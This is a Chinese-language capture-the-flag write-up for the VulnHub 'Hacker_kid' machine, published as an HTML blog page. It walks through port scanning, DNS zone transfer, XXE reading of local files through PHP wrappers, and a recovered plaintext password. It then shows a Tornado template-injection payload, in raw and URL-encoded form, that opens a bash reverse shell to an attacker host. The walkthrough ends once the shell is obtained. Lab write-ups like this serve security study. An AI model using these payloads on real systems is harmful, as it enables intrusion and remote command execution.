@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf8"/>
+    <meta name="viewport" content="initial-scale=1.0, width=device-width"/>
+    <title>
+      
+        Hacker_kid | Blanks'Blog
+      
+    </title>
+    <meta name="description" content=""/>
+    <meta name="keywords" content=""/>
+    
+      <link rel="apple-touch-icon"
+            sizes="180x180"
+            href="/images/apple-touch-icon.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="32x32"
+            href="/images/favicon-32x32.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="16x16"
+            href="/images/favicon-16x16.png"/>
+    
+    
+      <link rel="mask-icon"
+            href="/images/logo.svg"
+            color=""/>
+    
+    
+    
+      
+  <style>
+    @font-face {
+        font-family:sourceHanSerif;
+        src: url(/font/regular.ttf);
+        font-weight: regular;
+    }
+  </style>
+
+  <style>
+    @font-face {
+        font-family:sourceHanSerif;
+        src: url(/font/bold.ttf);
+        font-weight: bold;
+    }
+  </style>
+
+
+    
+    <link rel="stylesheet"
+          type="text/css"
+          href='/css/layout.css'/>
+    
+    
+  <link rel="stylesheet" type="text/css" href="/css/post.css" />
+  
+
+  <meta name="generator" content="Hexo 6.3.0"></head>
+  <body>
+    <div class="head">
+      <div class="nav">
+        <a href='/' class="nav-logo">
+          <img alt="logo" height="60px" width="60px" src="/images/logo.svg"/>
+        </a>
+        <input id="navBtn" type="checkbox"/>
+        <div class="nav-menu">
+          
+            
+              <a class="nav-menu-item" href="/%E5%AD%A6%E4%B9%A0">Notes</a>
+            
+          
+          
+        </div>
+        <label class="nav-btn" for="navBtn"></label>
+      </div>
+    </div>
+    <div class="body">
+      
+  <article class="post-content">
+    <div class="post-inner--toc">
+      <div class="post-content__head">
+        <div class="post-title">Hacker_kid</div>
+        <div class="post-info">
+          
+  <a href="/tags/vulnhub/" class="post-tag">#vulnhub</a><a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" class="post-tag">#漏洞利用</a><a href="/tags/Capabilitie%E6%8F%90%E6%9D%83/" class="post-tag">#Capabilitie提权</a>
+
+
+          <span class="post-date">2023-05-12</span>
+        </div>
+      </div>
+      
+        <aside class="toc-outer">
+          <div class="toc-title">目录</div>
+          <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">主机发现</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">端口扫描</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">ISC BIND</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">CVE-2021-25216（高危）</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">CVE-2021-25215（高危）</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">CVE-2021-25214（中危）</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">Tornado 框架</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">Tornado常见漏洞</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">WEB信息收集</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">DNS区域传输</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">DIG工具</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">XXE注入攻击</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">PHP封装器（伪协议）</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">SSTI模板注入</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">Capabilitie提权</span></a></li></ol>
+          <a href="#" class="toc-top">回到顶部</a>
+        </aside>
+      
+      <div class="post-content__body">
+        
+          <div class="post-gallery">
+            
+          </div>
+        
+        <meta name="referrer" content="no-referrer">
+
+
+<p><a name="PBOsN"></a></p>
+<h1><span id="主机发现">主机发现</span></h1><p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683875700552-ba780c62-b8fb-40a2-b174-ebef58dbb292.png#averageHue=%232f323d&clientId=u8ef56f46-65f9-4&from=paste&height=132&id=u3c305071&originHeight=264&originWidth=1247&originalType=binary&ratio=2&rotation=0&showTitle=false&size=85299&status=done&style=none&taskId=uf33d6a48-bcc0-4f0b-8f88-fb978f9a5b8&title=&width=623.5" alt="image.png"><br>发现存在 IP地址为 192.168.145.148的地址<br>可疑 ，对其进行端口扫描 已经基本信息搜集<br><a name="r8ED3"></a></p>
+<h1><span id="端口扫描">端口扫描</span></h1><p>端口扫描结果</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs xml">Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-12 03:24 EDT<br>Nmap scan report for hackers.blackhat.local (192.168.145.148)<br>Host is up (0.0013s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT     STATE SERVICE VERSION<br>53/tcp   open  domain  ISC BIND 9.16.1 (Ubuntu Linux)<br>80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))<br>9999/tcp open  http    Tornado httpd 6.1<br>MAC Address: 00:0C:29:6D:7B:05 (VMware)<br>Device type: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.6<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 25.46 seconds<br><br></code></pre></td></tr></table></figure>
+<p>发现存在 三个端口 分别是53 80 9999 </p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml">53/tcp   open  domain  ISC BIND 9.16.1 (Ubuntu Linux)<br>80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))<br>9999/tcp open  http    Tornado httpd 6.1<br></code></pre></td></tr></table></figure>
+<p>特别是 53 端口 和 9999 端口开放的服务<br>先看53 端口<br><a name="dd3nF"></a></p>
+<h2><span id="isc-bind">ISC BIND</span></h2><p>ISC BIND是美国Internet Systems Consortium（ISC）公司所维护的一套DNS域名解析服务软件。<br>存在一下漏洞（CVE-2021-25216按照说明是可执行代码的，但这里没有找到POC）<br><a name="f0uVY"></a></p>
+<h3><span id="cve-2021-25216高危">CVE-2021-25216（高危）</span></h3><p>GSS-TSIG是TSIG协议的扩展，旨在支持密钥的安全交换，以用于验证网络上各方之间通信的真实性。SPNEGO是GSS-TSIG的应用程序协议接口GSSAPI使用的协商机制。经发现，BIND使用的SPNEGO实现容易受到缓冲区溢出攻击。可能造成服务崩溃甚至代码执行。<br><a name="mLtwC"></a></p>
+<h3><span id="cve-2021-25215高危">CVE-2021-25215（高危）</span></h3><p>RFC 6672中描述的DNAME记录提供了一种重定向DNS中域名树的子树的方法。 named处理这些记录的方式中的缺陷可能触发多次尝试将相同的RRset添加到ANSWER节中的尝试。 这会导致BIND中的断言检查失败。DNAME记录由权威服务器和递归服务器处理。 对于权威服务器，可以从区域数据库中检索触发漏洞的DNAME记录。 对于执行递归的服务器，在发送给权威服务器的查询过程中会处理此类记录。<br>当named的易受攻击版本接收到触发上述漏洞的记录查询时，named进程将因断言检查失败而终止。<br><a name="lBLA5"></a></p>
+<h3><span id="cve-2021-25214中危">CVE-2021-25214（中危）</span></h3><p>损坏的入站增量区域更新（IXFR）可能导致named意外终止<br>看了一圈没有可以用的Poc ，这里是启动了DNS服务的可以看出，先留着，下一个<br><a name="EfHSM"></a></p>
+<h2><span id="tornado-框架">Tornado 框架</span></h2><p>Tornado是Tornado社区的一个Python Web框架和异步网络库。该库通过使用非阻塞网络I &#x2F; O，可以扩展到成千上万的开放连接，使其非常适合长时间轮询，WebSocket和其他需要与每个用户建立长期连接的应用程序。<br>众所周知，python框架比较多的漏洞是SSTI 模板注入漏洞，经过网上操作，Tornado是存在模板注入的，也存在文件包含漏洞<br><a name="LcRBN"></a></p>
+<h3><span id="tornado常见漏洞">Tornado常见漏洞</span></h3><ol>
+<li>Tornado 文件读取漏洞<br>2.  Tornado 跨站攻击，伪造cookie漏洞<br>3.  Tornado 模板注入漏洞<br><a name="p6cBy"></a></li>
+</ol>
+<h1><span id="web信息收集">WEB信息收集</span></h1><p>okey 接着访问 80 9999端口查看存在什么信息<br>80端口<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683877609085-995bca67-548d-4415-b93b-cf2f81f4d521.png#averageHue=%230f1019&clientId=u8ef56f46-65f9-4&from=paste&height=538&id=u2544efbf&originHeight=1076&originWidth=1602&originalType=binary&ratio=2&rotation=0&showTitle=false&size=72847&status=done&style=none&taskId=u27391a9b-7ef3-449e-a2c6-a691feb5693&title=&width=801" alt="image.png"><br>9999端口<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683877654319-1f005463-a89a-4145-bf9f-f0109b4e47e6.png#averageHue=%23c0c0c0&clientId=u8ef56f46-65f9-4&from=paste&height=507&id=u57abf4c4&originHeight=1014&originWidth=1622&originalType=binary&ratio=2&rotation=0&showTitle=false&size=36311&status=done&style=none&taskId=u389030fa-005a-4a05-a1f9-6b9a249c9df&title=&width=811" alt="image.png"><br>看了眼9999端口是一个登录框，不存在sql注入等，暴力破解无解<br>查看80端口，去发现是否存在突破口吧</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml">You have given me a name of Notorious Hacker right !! Just becuase i hacked your entire server.<br>Now i have got access to your entire server.If your are smart enough to get it back, just show me.<br><br>&quot;More you will DIG me,more you will find me on your servers..DIG me more...DIG me more&quot;<br><br></code></pre></td></tr></table></figure>
+<p>句子的意思是服务器的机主给他取了一个臭名昭著的黑客，然后黑了他的服务器，只有挖掘更多，才能发现他<br>这里存在一个DIG ，DIG是DNS工具，先留着<br>使用常见F12 大法查看源代码<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683878030405-fd3e2961-3d43-4da3-94d9-7815fa9298a4.png#averageHue=%231c1c23&clientId=u8ef56f46-65f9-4&from=paste&height=530&id=u5129aeed&originHeight=1059&originWidth=1669&originalType=binary&ratio=2&rotation=0&showTitle=false&size=203040&status=done&style=none&taskId=u4edabb6b-1fce-40e3-b9bc-4a42643f215&title=&width=834.5" alt="image.png"><br>在F12大法下发现了一个参数 </p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">TO DO: Use a GET parameter page_no  to view pages.<br></code></pre></td></tr></table></figure>
+<p>使用 page_no 查看更多<br>但另外还有两个页面<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683878130483-9d664754-f75b-4bd4-ad51-ca1b7141ded5.png#averageHue=%23131322&clientId=u8ef56f46-65f9-4&from=paste&height=439&id=ud6bcad11&originHeight=878&originWidth=1300&originalType=binary&ratio=2&rotation=0&showTitle=false&size=87139&status=done&style=none&taskId=u520049af-8251-46ee-9d70-a517d69002f&title=&width=650" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683878164219-5325eb37-ee56-45fe-848e-ec561eeb4804.png#averageHue=%23141521&clientId=u8ef56f46-65f9-4&from=paste&height=537&id=u15d28ac8&originHeight=1073&originWidth=1287&originalType=binary&ratio=2&rotation=0&showTitle=false&size=105483&status=done&style=none&taskId=u5a64ad26-bbb3-4788-bc46-043a8b0727c&title=&width=643.5" alt="image.png"><br>但是吧，并没有什么用处，再反过来看page_no <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683878213371-ea6dce13-b634-49fe-b6cc-c6aa887bc7d8.png#averageHue=%230f1019&clientId=u8ef56f46-65f9-4&from=paste&height=532&id=u81a62c7e&originHeight=1064&originWidth=1622&originalType=binary&ratio=2&rotation=0&showTitle=false&size=79567&status=done&style=none&taskId=ua5d6426f-66af-4312-b486-4704f064fbd&title=&width=811" alt="image.png"><br>出现了一句</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">Oh Man !! Isn&#x27;t is right to go a little deep inside? <br></code></pre></td></tr></table></figure>
+<p>再深入一点？ ？？<br>对这个数字进行爆破试一下<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683878405031-20696e2c-75ba-4956-acae-433b0f5dfc82.png#averageHue=%23f8f7f6&clientId=u8ef56f46-65f9-4&from=paste&height=750&id=uef17dfe3&originHeight=1499&originWidth=2087&originalType=binary&ratio=2&rotation=0&showTitle=false&size=162380&status=done&style=none&taskId=u22adb1b0-00ab-49d3-a689-6faa6c4a58e&title=&width=1043.5" alt="image.png"><br>发现21存在不一样<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683878436477-96c967e1-c25c-46f7-a032-612630ed5360.png#averageHue=%230d0e17&clientId=u8ef56f46-65f9-4&from=paste&height=465&id=uc27fb5bc&originHeight=929&originWidth=1424&originalType=binary&ratio=2&rotation=0&showTitle=false&size=80137&status=done&style=none&taskId=u90e04bc5-0b4b-4d4a-accc-d8bc79a3202&title=&width=712" alt="image.png"><br>果然，出现的提示更多了</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml">Okay so you want me to speak something ?<br>I am a hacker kid not a dumb hacker. So i created some subdomains to return back on the server whenever i want!!<br>Out of my many homes...one such home..one such home for me : hackers.blackhat.local<br></code></pre></td></tr></table></figure>
+<p>意思他拥有很多个子域名，但是其中有一个家 ，主域名算是 <br><code>hackers.blackhat.local</code><br>去访问一下，但是这里要添加 这个域名到&#x2F;etc&#x2F;hosts 文件里面。不然访问不了的是<br><a name="iCTGb"></a></p>
+<h1><span id="dns区域传输">DNS区域传输</span></h1><p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683878639704-d5c82fbe-6723-402e-b97c-36180ec4469b.png#averageHue=%23252a36&clientId=u8ef56f46-65f9-4&from=paste&height=137&id=ueda4ec59&originHeight=274&originWidth=430&originalType=binary&ratio=2&rotation=0&showTitle=false&size=60432&status=done&style=none&taskId=u34f310ce-797a-45c8-b90b-8b570620bcd&title=&width=215" alt="image.png"><br>要加上这么一条<br><code>192.168.145.148 hackers.blackhat.local</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683878701779-6979f8fc-3163-436a-8b80-de46a014fda5.png#averageHue=%230f101a&clientId=u8ef56f46-65f9-4&from=paste&height=486&id=uc82fd274&originHeight=972&originWidth=1493&originalType=binary&ratio=2&rotation=0&showTitle=false&size=71747&status=done&style=none&taskId=u109b80b3-4d57-46a8-83b3-481c00ba032&title=&width=746.5" alt="image.png"><br>但是好像还是主页面，并不存在什么 ，这里还是提到了<br><code>&quot;More you will DIG me,more you will find me on your servers..DIG me more...DIG me more&quot; </code><br><a name="Hrpp6"></a></p>
+<h2><span id="dig工具">DIG工具</span></h2><p>DIG 工具全称为域名信息搜索器（Domain InformationGroper），显示DNS查询过程的全过程，是一个不错的DNS故障诊断工具。<br>常见使用方法</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs xml">-v  显示版本<br><br>进行域名查询<br>dig www.baidu.com<br><br>指定域名服务器进行查询<br>dig www.baidu.com @8.8.8.8(谷歌服务器)<br><br><br>直接查看结果<br>dig+noall+answer www.baidu.com<br><br>使用迭代查询，跳过缓存DNS服务器，直接向各级域名服务器发起请求。<br>dig +trace www.baidu.com<br><br>查询百度的A记录<br>dig baidu.com A +noall +answer<br><br>查询百度A记录显示最简答案<br>dig www.baidu.com +short<br><br>显示详细信息但不显示dig版本信息<br>dig +nocmd baidu.com A +multiline +noall +answer<br><br>查询一个站点的ptr记录，通过IP查域名<br>dig -x 127.0.0.1<br><br>查询百度的权威记录<br>dig baidu.com NS +noall +answer<br><br>查询百度的MX（邮件交换）记录<br>dig baidu.com MX +noall +answer<br><br>批量查询文件中域名的dns解析，一行一个<br>dig -f D:\test.txt +noall +answer<br></code></pre></td></tr></table></figure>
+<p>我们这里使用迭代查询 和 指定域名查询<br>指定域名服务器进行查询</p>
+<blockquote>
+<p>dig hackers.blackhat.local @192.168.145.148</p>
+</blockquote>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683879242263-8cb2fe37-860b-48a8-85fb-5b4fc76a3f07.png#averageHue=%23242732&clientId=u8ef56f46-65f9-4&from=paste&height=208&id=u0e04a218&originHeight=415&originWidth=1049&originalType=binary&ratio=2&rotation=0&showTitle=false&size=125784&status=done&style=none&taskId=u34b56710-3b3c-45d6-bdb2-e877e8ab9aa&title=&width=524.5" alt="image.png"></p>
+<blockquote>
+<p>dig afxr  @192.168.145.148 blackhat.loca </p>
+</blockquote>
+<p>这条命令还是一点超时，有很多域名没有显示出来 ，没关系先把显示出来的域名加入<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683879564130-d3fef9ac-5aa6-41ea-ae09-77974ce44858.png#averageHue=%23232631&clientId=u8ef56f46-65f9-4&from=paste&height=347&id=u5939fcb8&originHeight=694&originWidth=1174&originalType=binary&ratio=2&rotation=0&showTitle=false&size=198326&status=done&style=none&taskId=u19042d15-0424-47b0-9619-0ed63b447e9&title=&width=587" alt="image.png"><br>加上这两条到 &#x2F;etc&#x2F;hosts 再去访问这两条，页面看看是存在什么效果<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683879736167-55b4a2fc-0517-46cb-90e7-9f4642e3741b.png#averageHue=%23242732&clientId=u8ef56f46-65f9-4&from=paste&height=35&id=u18067a68&originHeight=70&originWidth=533&originalType=binary&ratio=2&rotation=0&showTitle=false&size=11579&status=done&style=none&taskId=u67ebab6c-4383-4187-ad2c-325f35ccbcb&title=&width=266.5" alt="image.png"><br><a name="npFl8"></a></p>
+<h1><span id="xxe注入攻击">XXE注入攻击</span></h1><p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683879787593-fbb2a790-983d-479e-94b0-8277a2b9939b.png#averageHue=%23232b36&clientId=u8ef56f46-65f9-4&from=paste&height=247&id=uda406f54&originHeight=494&originWidth=1693&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1398222&status=done&style=none&taskId=u7015e8da-a848-4f7e-a6a9-33366db8c66&title=&width=846.5" alt="image.png"><br>访问 </p>
+<blockquote>
+<p>hackerkid.blackhat.local</p>
+</blockquote>
+<p>的时候出现了一个新的页面 ， 创建用户的意思 ，抓包创建一下 ，因为刚才9999端口是存在一个登录框的<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683880067662-e04b4075-1959-471a-b975-b711a8cfdb18.png#averageHue=%23fcfbfb&clientId=u8ef56f46-65f9-4&from=paste&height=642&id=u5990c2ec&originHeight=1283&originWidth=2014&originalType=binary&ratio=2&rotation=0&showTitle=false&size=121892&status=done&style=none&taskId=u9e4dcc15-52ef-4488-a118-a76bf924ab7&title=&width=1007" alt="image.png"><br>邮箱出，输入是什么就返回是什么数据 ，这里呢一般想到两种漏洞 xxe ，ssti模板注入<br>然后这里是php 页面 ，所以大概率不是ssti模板注入<br>那就使用xxe 去访问 &#x2F;读去本地文件试试看、<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683880217578-aefbdc63-839a-4673-bdb9-339108765aeb.png#averageHue=%23f5f5f5&clientId=u8ef56f46-65f9-4&from=paste&height=739&id=u7d592c3f&originHeight=1478&originWidth=2104&originalType=binary&ratio=2&rotation=0&showTitle=false&size=348183&status=done&style=none&taskId=u84055738-0cfb-4899-8f95-98207962204&title=&width=1052" alt="image.png"><br>使用XXE 文件读取代码是可以读完本地文件的<br>发现除了root 用户还存在一个saket用户是可以bin&#x2F;bash的 ，但是这里又没有开22端口，不能ssh<br>查看&#x2F;home&#x2F;saket用户目录下存在些什么数据<br>先看本地基本会有的是哪些文件<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683881812181-f2e2623b-7e57-4568-a733-0e24578c8269.png#averageHue=%23191a1d&clientId=u8ef56f46-65f9-4&from=paste&height=852&id=ue6cbc525&originHeight=1704&originWidth=1440&originalType=binary&ratio=2&rotation=0&showTitle=false&size=393985&status=done&style=none&taskId=u75467aa2-d2ee-4c33-a43a-e700f74df06&title=&width=720" alt="image.png"><br>这几个是常见的，文件优先查看。<br>随便查询一个都没有返回 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683881907618-891da107-9992-4895-b6af-affdf6a48b58.png#averageHue=%23fcfcfc&clientId=u8ef56f46-65f9-4&from=paste&height=640&id=u0a4ce07d&originHeight=1279&originWidth=1906&originalType=binary&ratio=2&rotation=0&showTitle=false&size=121238&status=done&style=none&taskId=u7dfd94bf-7d5e-4e7c-8c47-6f534e1efdd&title=&width=953" alt="image.png"><br><a name="TdA2d"></a></p>
+<h2><span id="php封装器伪协议">PHP封装器（伪协议）</span></h2><p>选择使用php伪协议去读取一下<br>其他文件均没有返回，唯独这个 .bashrc 配置文件返回了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683882057826-080a3400-a6b2-4479-ae8e-b22df8353b84.png#averageHue=%23f1f1f1&clientId=u8ef56f46-65f9-4&from=paste&height=722&id=ubdd52792&originHeight=1443&originWidth=1984&originalType=binary&ratio=2&rotation=0&showTitle=false&size=422620&status=done&style=none&taskId=ubfeadaa2-ac82-4490-a894-92e29cc128a&title=&width=992" alt="image.png"><br>对其进行解密<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683882138135-f7e12cb2-6140-4ebd-8ba3-9d7097d38460.png#averageHue=%23faf9f9&clientId=u8ef56f46-65f9-4&from=paste&height=371&id=u9f05d041&originHeight=742&originWidth=2505&originalType=binary&ratio=2&rotation=0&showTitle=false&size=57798&status=done&style=none&taskId=u0c9fd39f-a53b-438f-a2f2-7e979295e4c&title=&width=1252.5" alt="image.png"><br>解密之后会发现账号密码，我们可以记得 9999端口存在一个登录的地方 ，尝试登录一下</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">username=&quot;admin&quot;<br>password=&quot;Saket!#$%@!!&quot;<br></code></pre></td></tr></table></figure>
+<p><a name="BPUXK"></a></p>
+<h1><span id="ssti模板注入">SSTI模板注入</span></h1><p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683882251919-7fcac280-a01e-4572-9d27-bc5cad0fb313.png#averageHue=%23fefefe&clientId=u8ef56f46-65f9-4&from=paste&height=263&id=ue2891deb&originHeight=526&originWidth=1491&originalType=binary&ratio=2&rotation=0&showTitle=false&size=31160&status=done&style=none&taskId=u913e3a17-9479-40b3-8510-7fe359f7adb&title=&width=745.5" alt="image.png"><br>好像不对啊，这个账号密码，<br>这个密码感觉也不像是admin 用户的，密码带有saket <br>是不是saket 用户的呢 ，本来就存在这么一个用户 ，对其进行测试登录看看<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683882355116-037541db-c40d-47a5-bf2f-8234faad92cf.png#averageHue=%23c0c0c0&clientId=u8ef56f46-65f9-4&from=paste&height=345&id=ufddbb740&originHeight=690&originWidth=1577&originalType=binary&ratio=2&rotation=0&showTitle=false&size=33423&status=done&style=none&taskId=u548e8411-01b3-4b3f-b7b7-184a6e245b3&title=&width=788.5" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683882363176-807d36bb-9fc0-4dcc-b6de-d7e01a0d9647.png#averageHue=%23000000&clientId=u8ef56f46-65f9-4&from=paste&height=316&id=u012da382&originHeight=631&originWidth=1576&originalType=binary&ratio=2&rotation=0&showTitle=false&size=26143&status=done&style=none&taskId=u24e71dd4-69ae-424d-8487-64fe7f637a8&title=&width=788" alt="image.png"><br>成功登录上了</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">Tell me your name buddy<br><br>How can i get to know who are you ??<br><br></code></pre></td></tr></table></figure>
+<p>让告诉他名字 可能是以 name 作为参数的<br>试一下<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683882630759-005456f2-2e8f-4b1d-bd36-1b917614a8e2.png#clientId=u8ef56f46-65f9-4&from=paste&height=342&id=uee3d2566&originHeight=683&originWidth=1525&originalType=binary&ratio=2&rotation=0&showTitle=false&size=28240&status=done&style=none&taskId=ub5df3087-89cd-4452-a569-65d16ff1791&title=&width=762.5" alt="image.png"><br>这个和前面那个邮箱差不多 ，但是把这里python的环境 而且是 Tornado是框架<br>是可能存在ssti 模板注入的<br>简单的使用 49 payload 测试一下<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683882781385-2084b4fa-289e-433c-9bd8-77ecba929065.png#clientId=u8ef56f46-65f9-4&from=paste&height=317&id=u90ab56ee&originHeight=633&originWidth=1648&originalType=binary&ratio=2&rotation=0&showTitle=false&size=29174&status=done&style=none&taskId=ua01784ac-d076-424d-8ed3-20bde8c8575&title=&width=824" alt="image.png"><br>我这里输入 payload 返回了49 ，证明执行了49的表达式<br>那往上找一下反弹shell的payload </p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&#123;% import os %&#125;&#123;&#123;os.system(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.145.130/4444 0&gt;&amp;1&quot;&#x27;)&#125;&#125;<br></code></pre></td></tr></table></figure>
+<p>对这段代码进行url编码然后进行反弹shell</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">%7b%25%20%69%6d%70%6f%72%74%20%6f%73%20%25%7d%7b%7b%6f%73%2e%73%79%73%74%65%6d%28%27%62%61%73%68%20%2d%63%20%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%31%34%35%2e%31%33%30%2f%34%34%34%34%20%30%3e%26%31%22%27%29%7d%7d <br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683882957809-42893663-84b5-4ab5-8786-7ca4090b56bb.png#averageHue=%23000000&clientId=u8ef56f46-65f9-4&from=paste&height=459&id=u14fc4ad2&originHeight=918&originWidth=1508&originalType=binary&ratio=2&rotation=0&showTitle=false&size=42084&status=done&style=none&taskId=u0b7fae51-87d2-4bc8-bb3d-e58531955c2&title=&width=754" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683882971124-7a677b84-0093-4b22-b3bc-a249bd39ea3e.png#averageHue=%23232531&clientId=u8ef56f46-65f9-4&from=paste&height=352&id=u3b59588e&originHeight=703&originWidth=1156&originalType=binary&ratio=2&rotation=0&showTitle=false&size=131880&status=done&style=none&taskId=uaaa67f06-2ae5-426c-89a6-e6c472d61e2&title=&width=578" alt="image.png"><br>成功反弹shell了 </p>
+<p><a name="gwAUj"></a></p>
